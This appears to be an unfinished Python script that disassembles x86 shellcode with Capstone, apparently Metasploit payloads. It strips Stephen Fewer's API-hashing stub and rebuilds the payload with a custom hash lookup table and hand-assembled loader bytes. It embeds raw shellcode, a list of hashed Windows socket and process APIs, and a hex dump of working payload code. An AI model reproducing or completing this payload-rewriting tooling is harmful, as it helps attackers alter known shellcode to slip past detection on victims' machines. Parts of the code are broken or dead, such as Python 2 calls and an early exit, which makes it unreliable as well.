#!/usr/bin/env python3

# Capstone Python bindings, by Nguyen Anh Quynnh <aquynh@gmail.com>
from __future__ import print_function
from capstone import *
from capstone.x86 import *
import struct
import io
import sys
import re
import random
import string
from build_code import build_code
from collections import OrderedDict
import binascii


#from xprint import to_hex, to_x, to_x_32

#testcode = 
#testcode = open(sys.argv[1], 'rb').read()
#print("Len stdin:", len(testcode))
  

# ## Test class Cs
class x86_code_class:
    
    def __init__(self, code):
        self.tracker = []
        self.code = code
        self.arch = CS_ARCH_X86
        self.mode = CS_MODE_32
        self.comment = "X86 32 (Intel syntax)"
        self.syntax = 0
        self.api_hashes = {}
        self.called_apis = []
        self.string_table = ''
        self.tracker_dict = {}
        self.block_order = []
        
        self.fewerapistub = bytes("\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
                            "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
                            "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
                            "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
                            "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
                            "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
                            "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
                            "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
                            "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
                            "\x8d", 'iso-8859-1')

        self.hashes = [  ( 0x006B8029, "ws2_32.dll!WSAStartup" ),
                         ( 0xE0DF0FEA, "ws2_32.dll!WSASocketA" ),
                         ( 0x33BEAC94, 'ws2_32.dll!WSAaccept'),
                         ( 0x6737DBC2, "ws2_32.dll!bind" ),
                         ( 0xFF38E9B7, "ws2_32.dll!listen" ),
                         ( 0xE13BEC74, "ws2_32.dll!accept" ),
                         ( 0x614D6E75, "ws2_32.dll!closesocket" ),
                         ( 0x6174A599, "ws2_32.dll!connect" ),
                         ( 0x5FC8D902, "ws2_32.dll!recv" ),
                         ( 0x5F38EBC2, "ws2_32.dll!send" ),
                         ( 0x5BAE572D, "kernel32.dll!WriteFile" ),
                         ( 0x4FDAF6DA, "kernel32.dll!CreateFileA" ),
                         ( 0x13DD2ED7, "kernel32.dll!DeleteFileA" ),
                         ( 0xE449F330, "kernel32.dll!GetTempPathA" ),
                         ( 0x528796C6, "kernel32.dll!CloseHandle" ),
                         ( 0x863FCC79, "kernel32.dll!CreateProcessA" ),
                         ( 0xE553A458, "kernel32.dll!VirtualAlloc" ),
                         ( 0x300F2F0B, "kernel32.dll!VirtualFree" ),
                         ( 0x0726774C, "kernel32.dll!LoadLibraryA" ),
                         ( 0x7802F749, "kernel32.dll!GetProcAddress" ),
                         ( 0x601D8708, "kernel32.dll!WaitForSingleObject" ),
                         ( 0x876F8B31, "kernel32.dll!WinExec" ),
                         ( 0x9DBD95A6, "kernel32.dll!GetVersion" ),
                         ( 0xEA320EFE, "kernel32.dll!SetUnhandledExceptionFilter" ),
                         ( 0x56A2B5F0, "kernel32.dll!ExitProcess" ),
                         ( 0x0A2A1DE0, "kernel32.dll!ExitThread" ),
                         ( 0x6F721347, "ntdll.dll!RtlExitUserThread" ),
                         ( 0x23E38427, "advapi32.dll!RevertToSelf" ),
                         ( 0xa779563a, "wininet.dll!InternetOpenA"),
                         ( 0xc69f8957, "wininet.dll!InternetConnectA"),
                         ( 0x3B2E55EB, "wininet.dll!HttpOpenRequestA"),
                         ( 0x869E4675, "wininet.dll!InternetSetOptionA"),
                         ( 0x7B18062D, "wininet.dll!HttpSendRequestA"),
                         ( 0xE2899612, "wininet.dll!InternetReadFile"),
              ]    
    
    def get_hash(self, anumber):
        for ahash in self.hashes:
            if hex(ahash[0]) == anumber:
                self.called_apis.append(ahash[1])
                self.api_hashes[ahash[0]] = ahash[1]
                return ahash[1]
                
        return None   

    def get_it_order(self):
        self.replace_string = ''

        m = re.search(b'\xe8.{4}/(.*?)\x00', self.code)
        if m:
            #print(len(m.group()))
            self.replace_string = m.group()[5:]
            print(self.replace_string.encode('hex'))
            self.astring = "\xcc" * (len(m.group()) - 5)
            self.code = re.sub(b'/(.*?)\x00', self.astring , self.code)
            print ("Length of offending string:", len(self.astring))
            print("Code length after URL replacement with '\\xcc' (breaks capstone disasm):", len(self.code))

        if self.fewerapistub in self.code:
                #strip it
                print("Striping Stephen Fewers hash API call")
                print('type(code) {0} type(fewerapistub) {1}'.format(type(self.code), type(self.fewerapistub)))
                self.code = self.code.replace(self.fewerapistub, b'')
                print("metasploit payload:", binascii.hexlify(self.code))
        
        # Strip out url random hash here (replace with \xCC)
        
        print("*" * 16)
        print("Platform: %s" % self.comment)
        #print("self.Code: %s" % self.code)
        
    def block_tracker(self, buildcode=False):
        '''
        This is really for finding APIs....
        1st pass, find apis, put them in a string
        2nd pass, call engine.inspect_block
        '''
        current_block = ''
        
        for a_block in self.block_order:
            ebx = ''  # To track exit function
            ebp = ''
            call_op = ''
            jne_op = ''
            prior_key = ''
            print("\t"+"@"*25)
            tmp_block = OrderedDict({})
            
            for key, value in self.tracker_dict.items():
                if value['blocktag'] == a_block:
                    #print("\t[?]",key, value)
                    tmp_block[key] = value
                # DO ASM checks here
                #print(value['bytes'])
                
                    if value['bytes'] == '\xc3':
                        print('\tFound a Ret')

                    elif value['mnemonic'] + " " + value['op_str'] == u"call ebp": #call ebp
                        print("\tCall ebp")
                        # TODO: SEE BELOW find values of push ebx and and push XXXXXX
                        if self.tracker_dict[prior_key]['mnemonic'] + " " + self.tracker_dict[prior_key]['op_str'] == "push ebx": # push ebx
                            print("\tPush EBX:", ebx)
                            called_api = self.get_hash(ebx)

                            print("\tCalling Function:", called_api)
                            if called_api == None:
                                continue
                            elif 'LoadLibraryA'.lower() not in called_api.lower() and buildcode is True: 
                                print("[^] Testing success")
                                self.engine.inspect_block(tmp_block, called_api)
                                continue
                        elif self.tracker_dict[prior_key]['mnemonic']  == 'push': # push XXXXX
                            print("\tPush EBP:", ebp)
                            called_api = self.get_hash(ebp)
                            print("\tCalling Function:", called_api)
                            if called_api == None:
                                continue
                            elif 'LoadLibraryA'.lower() not in called_api.lower() and buildcode is True: 
                                print("[#] Testing success")
                                self.engine.inspect_block(tmp_block, called_api)
                                continue

                    elif self.replace_string == value:
                        print("\tFound replace_string")

                    elif 'mov ebx' in value['mnemonic'] + " " + value['op_str']: # mov ebx ?
                        print("[!!] mov ebx")
                        print(value['mnemonic'], "+", value['op_str'])
                        if len(value['bytes']) > 2:
                            ebx = hex(struct.unpack("<I", value['bytes'][1:])[0])
                        #print(hex(struct.unpack("<I", asm[1:])[0]))

                    elif value['mnemonic'] == 'push' and len(value['bytes']) > 1: # push
                        ebp = value['op_str']
                    
                    elif value['mnemonic'] == 'call': #call
                        # I DON'T THINK I NEED THIS ANYMORE
                        print("\tHardcoded Call")
                        call_op = value['op_str']
                        called_api = self.get_hash(call_op)
                        print("\tCalling Function:", called_api)
                        if buildcode is True:
                            self.engine.inspect_block(tmp_block, called_api)
                        continue
                    elif 'jmp' in value['mnemonic']:
                        print('\tA JMP', value['op_str'])
                        call_op = value['op_str']
                        called_api = self.get_hash(call_op)
                        print("\tCalling Function:", called_api)
                        if buildcode is True:
                            self.engine.inspect_block(tmp_block, called_api)
                        continue
                        #self.tracker_dict[prior_key]['bytes']
                        #if self.tracker_dict[prior_key]['bytes'][0] == 0x75:
                        #    jne_op = self.tracker_dict[prior_key]['bytes'][1:]
                        #    print("\tJNE before:", call_op)
                    elif 'ret' in value['mnemonic']:
                        print('\tA ret, ending call block')
                        call_op = value['op_str']
                        called_api = self.get_hash(call_op)
                        print("\tCalling Function:", called_api)
                        if buildcode is True:
                            self.engine.inspect_block(tmp_block, called_api)
                        continue
                        
                    prior_key = key

                     
            #print("\t\t", tmp_block)
        
    # now I need to track call blocks
    # start and go until you find Call EBP
    def doit(self):
        print("Disasm:")
        print("*" * 16)
        print(self.code)
        self.engine = build_code()
        try:
            md = Cs(self.arch, self.mode)
            md.detail = True

            if self.syntax != 0:
                md.syntax = self.syntax

            tmp_tracker = []
            tmp_string = ''
            '''
            new structure
            tracker = {hex(insn.address):tmp_tracker}
            tmp = {'bytes':insn.bytes,
                           'mnemonic':insn.mnemonic,
                           'op_str':insn.op_str
                           'controlFlowTag': # assigned at jump/call (find earlier location or wait for future)
                           'blocktag': #assigned at start of new block
                           }
            '''
            # init tmp
            tmp = {}
            #initialize blocktag
            blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))

            for insn in md.disasm(self.code, 0):
                #print_insn_detail(mode, insn)
                width = 30 - len(''.join('\\x{:02x}'.format(x) for x in insn.bytes))
                print("%s: %s\" %s %s %s" % (hex(insn.address), ''.join('\\x{:02x}'.format(x) for x in insn.bytes), '#'.rjust(width), insn.mnemonic, insn.op_str))
                #print ("0x%x:\n" % (insn.address + insn.size))
                #"%s" % "".join('\\x{:02x}'.format(x) for x in insn.bytes))
                #print(insn.op_str)
                
                #if insn.mnemonic == 'mov':
                #    if ' eax' == insn.op_str.split(',')[1]:
                #        print(insn.op_str)
                #        tmp_tracker.append('save eax')
                
                #add_back in later
                #if insn.mnemonic == 'int3':
                #    tmp_string += insn.bytes
                #    continue
                #elif tmp_string != '':
                #    #End of tmpstring
                #    print("Adding offending string back in")
                #    self.tracker.append([self.replace_string])
                #    tmp_string = ''
                    #tmp_tracker = []  # not needed

                tmp_tracker.append([insn.bytes, insn.mnemonic, insn.op_str])
                tmp = {'bytes': insn.bytes,
                       'mnemonic': insn.mnemonic, 
                       'op_str': insn.op_str,
                       'controlFlowTag': None,
                       'blocktag': blocktag,
                       }

                self.tracker_dict[insn.address] = tmp
                if insn.mnemonic + " " + insn.op_str == 'call ebp':
                    #print(tmp_tracker)
                    #print(tmp_tracker[len(tmp_tracker)-2][1:]) 
                 
                    self.tracker.append(tmp_tracker)
                    # set new blocktag
                    tmp_tracker=[] 
                    blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                    
                elif insn.mnemonic == "call":
                    print("call", insn.op_str)
                    if tmp_tracker[len(tmp_tracker)-1] == 0x68:
                        print("Found server_uri, string")
                    self.tracker.append(tmp_tracker)
                    tmp_tracker = []
                    #new blocktag
                    self.tracker_dict[insn.address]['controlFlowTag'] = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                    # is the call in the positive or negative?
                    blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                    
                elif 'jmp' in insn.mnemonic:
                    print('a jmp instruction', insn.mnemonic, insn.op_str)
                    #''.join(random.choice(string.ascii_lowercase[6:]+string.ascii_uppercase[6:]) for _ in range(8))
                    #''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                    self.tracker.append(tmp_tracker)
                    tmp_tracker = []
                    # new blocktag
                    self.tracker_dict[insn.address]['controlFlowTag'] = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                    # is the jmp postive or negative
                    blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                
                elif 'ret' in insn.mnemonic:
                    print('a ret instruction', insn.mnemonic, insn.op_str)
                    self.tracker.append(tmp_tracker)
                    tmp_tracker = []
                    blocktag = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                
                elif 'j' in insn.mnemonic:
                    print('another jump, just assigning cft')
                    self.tracker_dict[insn.address]['controlFlowTag'] = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                
                if blocktag not in self.block_order:
                    self.block_order.append(blocktag)
                    
        except Exception as e:
            print("ERROR: %s" % e)
            sys.exit(-1)

        # Next rebuild each self.code block
        #print("tracker:", self.tracker)
        # Identify the api being used.
        
        self.tracker_dict = OrderedDict(sorted(self.tracker_dict.items()))
        print("block_order", self.block_order)
        # Now find assign controlFLowTags
        print ('*'*50)
        print("Assigning matching controlFLowTags")
        for key, value in self.tracker_dict.items():
            #print("\t", key,value)
            if value['controlFlowTag']:
                try:
                    print(int(value['op_str'], 16),",", end='')
                    print(self.tracker_dict[int(value['op_str'], 16)]['controlFlowTag'])
                    self.tracker_dict[int(value['op_str'], 16)]['controlFlowTag'] = value['controlFlowTag']
                    print("Found Block w/CFT:", self.tracker_dict[int(value['op_str'], 16)]['blocktag'])
                    # assign to entire block:
                except Exception as e:
                    print("controlFlowTag probably already assigned if this is an error:", e)

                    
        for key, value in self.tracker_dict.items():
            if value['controlFlowTag'] and ('call' in value['mnemonic'] or 'j' in value['mnemonic']):
                print('[++++] Found Control Flow Tag', value)
                if len(value['bytes']) < 4:
                    print("\tless than 4", value['bytes'])
                    if int.from_bytes(value['bytes'][1:], 'little') < 0x80:
                        value['direction'] = 'forward'
                    else:
                        value['direction'] = 'backwards'
                elif len(value['bytes']) == 5:
                    print("\texactly 5", value['bytes'])
                    if int.from_bytes(value['bytes'][1:], 'little') < 0x80000000:
                        value['direction'] = 'forward'
                    else:
                        value['direction'] = 'backwards'
                elif len(value['bytes']) > 5:
                    print('WTF x64 or Far jmp')
                print('value[direction]', value['direction'])
        

        print ('*'*50)
        for key, value in self.tracker_dict.items():
            print("\t", key,value)
        # NOW do work on the self.tracker_dict
        self.block_tracker()    
        
        print(self.called_apis)
        print("self.api_hashes", self.api_hashes)
        # make hash table
        tmp_bytes = b''
        for some_hash, api_lookup in self.api_hashes.items():
            tmp_bytes += struct.pack("<I", some_hash) + b"\x00\x00"

        # make string table
        string_set = set()
        for api in self.called_apis:
            print(api.split("!"))
            string_set.add(api.split("!")[0].replace(".dll",''))
            string_set.add(api.split("!")[1])
        print(string_set)
        for api in string_set:
            self.string_table += api + "\x00"
        print("String Table:", self.string_table)
        self.string_table = bytes(self.string_table, 'iso-8859-1')
        # put the hashes and string table together "\x00\x00\x00\x00" denotes end of hashes 
        self.lookup_table = tmp_bytes + b"\x00\x00\x00\x00" + self.string_table
        print(binascii.hexlify(self.lookup_table), len(self.lookup_table))
        # FIND OFFSETS for the lookup_table and populate
        
        for some_hash, api_lookup in self.api_hashes.items():
            print('some_hash', hex(some_hash))
            print('meh', re.escape(struct.pack("<I", some_hash)))
            m = re.search(re.escape(struct.pack("<I", some_hash)), self.lookup_table)
            print(m.start(), m.group())
            aDLL = api_lookup.split("!")[0].replace(".dll",'')
            anAPI = api_lookup.split("!")[1]
            print('aDLL', aDLL, 'anAPI', anAPI)
            d = re.search(bytes(aDLL, 'iso-8859-1'), self.lookup_table)
            print("\t", hex(d.start()), d.group())
            a = re.search(bytes(anAPI, 'iso-8859-1'), self.lookup_table)
            print("\t", hex(a.start()), a.group())
            self.lookup_table = self.lookup_table[:m.start()+4] + struct.pack("B", d.start() - m.start()-4) + struct.pack("B", a.start() - m.start()-5) + self.lookup_table[m.start()+6:]
            
        '''
        m = re.search(b'\xe8.{4}/(.*?)\x00', self.code)
        if m:
            #print(len(m.group()))
            self.replace_string = m.group()[5:]
            print(self.replace_string.encode('hex'))
            self.astring = "\xcc" * (len(m.group()) - 5)
            self.code = re.sub(b'/(.*?)\x00', self.astring , self.code)
            print ("Length of offending string:", len(self.astring))
            print("Code length after URL replacement with '\\xcc' (breaks capstone disasm):", len(self.code))
        '''
        #print("Updated table", binascii.hexlify(self.lookup_table), len(self.lookup_table))
        self.shellcode = b''
        ## TODO: ADD STUB HERE:

        if len(self.lookup_table) < 256/2:
            self.shellcode += b'\xeb'
            self.shellcode += struct.pack("<B", len(self.lookup_table))
        else:
            self.shellcode += b"\xe9"
            self.shellcode += struct.pack("<I", len(self.lookup_table))
        
        self.shellcode += self.lookup_table
        table_offset = len(self.shellcode) - len(self.lookup_table)
        print("1st Table offset", table_offset)
        #TODO; Update the call below to point to the metasploit shellcode
        self.shellcode += (b"\x33\xC0"                     # XOR EAX,EAX
                           b"\xBE\x4C\x77\x26\x07"         # MOV ESI,726774C
                           b"\x3B\x74\x24\x24"             # CMP ESI,DWORD PTR SS:[ESP+24]
                           b"\x74\x0B"                     # JE SHORT 001C0189
                           b"\xBE\x49\xF7\x02\x78"         # MOV ESI,7802F749
                           b"\x3B\x74\x24\x24"             # CMP ESI,DWORD PTR SS:[ESP+24]
                           b"\x75\x02"                     # JNZ SHORT 001C018B
                           b"\x61"                         # POPAD
                           b"\xC3"                         # RETN
                           b"\xE8\x00\x00\x00\x00"         # CALL 001C0190
                           b"\x5E"                         # POP ESI
                           )
        print("offset length", len(self.shellcode) - table_offset)

        #self.shellcode += b"\x8B\x8E\x29\xFF\xFF\xFF"     # MOV ECX,DWORD PTR DS:[ESI-D7]
        self.shellcode += b"\x8B\x8E"
        print("offset", struct.pack("<I", 0xffffffff - len(self.shellcode) - table_offset + 14))    
        updated_offset = 0xFFFFFFFF - len(self.shellcode) - table_offset + 14
        self.shellcode += struct.pack("<I", 0xffffffff-len(self.shellcode) - table_offset + 14)
        self.shellcode += b"\x3B\x4C\x24\x24"             # CMP ECX,DWORD PTR SS:[ESP+24]
        self.shellcode += b"\x74\x05"                     # JNZ SHORT 001C0191
        self.shellcode += b"\x83\xC6\x06"                 # ADD ESI,6
        self.shellcode += b"\xEB\xEF"                     # JMP SHORT 001C0191
        self.shellcode += b'\x8B\x8E'                     # MOV ECX,DWORD PTR DS:[ESI-XX]
        self.shellcode += struct.pack("<I", updated_offset + 4)
        self.shellcode += b"\x8A\xC1"                      # MOV AL,CL

        self.shellcode += b"\x8B\xCE"                           # MOV ECX,ESI
        self.shellcode += b"\x03\xC8"                           # ADD ECX,EAX
        self.shellcode += b"\x81\xE9"
        print(abs(updated_offset - 0xffffffff +3))
        self.shellcode += struct.pack("<I", abs(updated_offset - 0xffffffff +3)) # SUB ECX,0EB
        self.shellcode += b"\x51"                               # PUSH ECX
        #self.shellcode += b"\x8B\x4C\x24\x14"                     # MOV ECX,DWORD PTR SS:[ESP+14]
        self.shellcode += b"\xFF\x13"                             # CALL DWORD PTR DS:[EBX]                  ; KERNEL32.LoadLibraryA
        
        self.shellcode += b"\x8B\xD0"                             # MOV EDX,EAX
        self.shellcode += b"\x33\xC0"                             # XOR EAX,EAX
        self.shellcode += b"\x8B\x8E\x15\xFF\xFF\xFF"                      # MOV ECX,DWORD PTR DS:[ESI-EB]
        self.shellcode += b"\x8A\xC5"                                      # MOV AL,CH
        self.shellcode += b"\x8B\xCE"                                      # MOV ECX,ESI
        self.shellcode += b"\x03\xC8"                                      # ADD ECX,EAX
        self.shellcode += b"\x81\xE9"                      # SUB ECX,0EB
        self.shellcode += struct.pack("<I", abs(updated_offset - 0xffffffff + 4))
        self.shellcode += b"\x51"                                          # PUSH ECX
        self.shellcode += b"\x52"                                          # PUSH EDX
        #self.shellcode += b"\x8B\x4C\x24\x1C"                              # MOV ECX,DWORD PTR SS:[ESP+1C]
        self.shellcode += b"\xFF\x55\x00"                                      # CALL DWORD PTR DS:[EDX]
        self.shellcode += b"\x61"               # POPAD
        self.shellcode += b"\x8B\x44\x24\xB8"       # MOV EAX,DWORD PTR SS:[ESP-48]
        self.shellcode += b"\x5E"               # POP ESI
        self.shellcode += b"\x59"               # POP ECX
        self.shellcode += b"\xFF\xD0"             # CALL EAX                                 ; WS2_32.WSAStartup
        self.shellcode += b"\x56"               # PUSH Esi
        self.shellcode += b"\xC3"               # RETN

#8B D0 33 C0 8B 8E 15 FF FF FF 8A C1 8B CE 03 C8 81 E9 EB 00 00 00 51 52 8B 4C 24 1C



        working_code = '''

        E8 30 02 00 00 FC 60 8B EC FC 31 D2 64 8B 52 30 8B 52 08 8B DA 03 52 3C 8B BA 80 00 00 00 03 FB
        8B 57 0C 03 D3 81 3A 4B 45 52 4E 74 05 83 C7 14 EB EE 57 EB 3E 8B 57 10 03 D3 8B 37 03 F3 8B CA
        81 C1 00 00 FF 00 33 ED 8B 06 03 C3 83 C0 02 3B C8 72 18 3B C2 72 14 3E 8B 7C 24 04 39 38 75 0B
        3E 8B 7C 24 08 39 78 08 75 01 C3 83 C5 04 83 C6 04 EB D5 68 61 72 79 41 68 4C 6F 61 64 E8 B3 FF
        FF FF 03 D5 83 C4 08 5F 52 68 64 64 72 65 68 47 65 74 50 E8 9D FF FF FF 03 D5 5D 5D 5B 8B EA FC
        90 E9 C7 00 00 00 F0 B5 A2 56 85 35 79 CC 3F 86 7F 8E A6 95 BD 9D 79 97 99 A5 74 61 7C 2F 08 87
        1D 60 6D 96 29 80 6B 00 70 5B EA 0F DF E0 6A 3D 47 13 72 6F 20 25 4C 77 26 07 55 3C 00 00 00 00
        45 78 69 74 50 72 6F 63 65 73 73 00 63 6F 6E 6E 65 63 74 00 6E 74 64 6C 6C 00 52 74 6C 45 78 69
        74 55 73 65 72 54 68 72 65 61 64 00 57 53 41 53 6F 63 6B 65 74 41 00 4C 6F 61 64 4C 69 62 72 61
        72 79 41 00 57 53 41 53 74 61 72 74 75 70 00 6B 65 72 6E 65 6C 33 32 00 77 73 32 5F 33 32 00 43
        72 65 61 74 65 50 72 6F 63 65 73 73 41 00 47 65 74 56 65 72 73 69 6F 6E 00 57 61 69 74 46 6F 72
        53 69 6E 67 6C 65 4F 62 6A 65 63 74 00 90 90 90 90 90 90 90 90 90 33 C0 BE 4C 77 26 07 3B 74 24
        24 74 0B BE 49 F7 02 78 3B 74 24 24 75 02 61 C3 E8 00 00 00 00 5E 8B 8E 11 FF FF FF 3B 4C 24 24
        74 05 83 C6 06 EB EF 8B 8E 15 FF FF FF 8A C1 8B CE 03 C8 81 E9 EB 00 00 00 51 90 90 90 90 FF 13
        8B D0 33 C0 8B 8E 15 FF FF FF 8A C5 8B CE 03 C8 81 E9 EA 00 00 00 51 52 90 90 90 90 FF 55 00 61
        8B 44 24 B8 5E 59 FF D0 56 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
        90 90 90 90 90 90 90 90 90


        '''


        #TODO: Now start building shellcode
        #self.shellcode += self.lookup_table
        print("Updated table", binascii.hexlify(self.shellcode), len(self.shellcode))
        
        print("EXIT")
        
        sys.exit()

        '''
        print(len(self.string_table))
        self.shellcode = b''
        if len(self.string_table) < 256/2:
            self.shellcode += b'\xeb'
            self.shellcode += struct.pack("<B", len(self.string_table))
        else:
            self.shellcode += b"\xe9"
            self.shellcode += struct.pack("<I", len(self.string_table))

        #TODO: Now start building shellcode
        self.shellcode += self.string_table
        
        print(self.shellcode)
        self.engine = build_code({len(self.shellcode):{"bytes": self.shellcode, 
                                                        'mnemonic': 'initialblob', 
                                                        'op_str': 'initialblob',
                                                        'blocktag': 'initialblob',
                                                        'controlFlowTag': 'initialblob',
                                                        }})
        #self.block_tracker(buildcode=True)
        
        #print(self.engine.shellcode) 
        cfts = {}
        for key, value in self.engine.shellcode.items():
            if not value['controlFlowTag']:
                continue
            if value['controlFlowTag'] != 'initialblob':
                if value['controlFlowTag'] not in cfts.keys():
                    cfts[value['controlFlowTag']] = -key
                else:
                    cfts[value['controlFlowTag']] += key
        for key, value in self.engine.shellcode.items():
            tmp = b''
            if not value['controlFlowTag']:
                continue
            if value['controlFlowTag'] == 'initialblob':
                continue
            if ('call' in value['mnemonic'] or 'j' in value['mnemonic']):
                print("[,.,.] Found it", value['direction'])
                if len(value['bytes']) < 4:
                    print("\tless than 4", type(value['bytes'][0]), type(value['bytes'][1]), len(value['bytes']))
                    if value['direction'] is 'forward':
                        print('forward')
                        tmp = struct.pack("B", value['bytes'][0]) + struct.pack('B', cfts[value['controlFlowTag']] -1)
                    else:
                        print('backwards')
                        tmp = struct.pack("B", value['bytes'][0]) + struct.pack("B", 0xff - cfts[value['controlFlowTag']] - 2)
                        
                elif len(value['bytes']) == 5:
                    print("\texactly 5", value['bytes'])
                    if value['direction'] is 'forward':
                        print('forward')
                        tmp =  struct.pack("B", value['bytes'][0]) + struct.pack("I", cfts[value['controlFlowTag']] - 5)
                    else:
                        print('backwards')
                        tmp =  struct.pack("B", value['bytes'][0]) + struct.pack("I", 0xffffffff - cfts[value['controlFlowTag']] - 6)
                    
                elif len(value['bytes']) > 5:
                    print('WTF x64 or Far jmp')
                
                self.engine.shellcode[key]['bytes'] = tmp
                print('After', self.engine.shellcode[key])

        print("cfts", cfts)
        print(binascii.hexlify(self.engine.return_shellcode()))
        #for cft in cfts:
        #    tmp_cft = []
        #    for key, value in self.engine.shellcode.items():


    #if len(tmp_tracker[len(tmp_tracker)-2][1:]) == 4:
    #    print("test", struct.unpack("<I", tmp_tracker[len(tmp_tracker)-2][1:])[0])
    #        
    #    if struct.unpack("<I", tmp_tracker[len(tmp_tracker)-2][1:])[0] == 0x006B8029:
    #        print("yup") 
            
    #if loadlibrary A is used we can get rid of it
    '''
if __name__ == '__main__':
    #print(sys.stdin.buffer.read())
    test = x86_code_class(sys.stdin.buffer.read())
    test.get_it_order()
    test.doit()


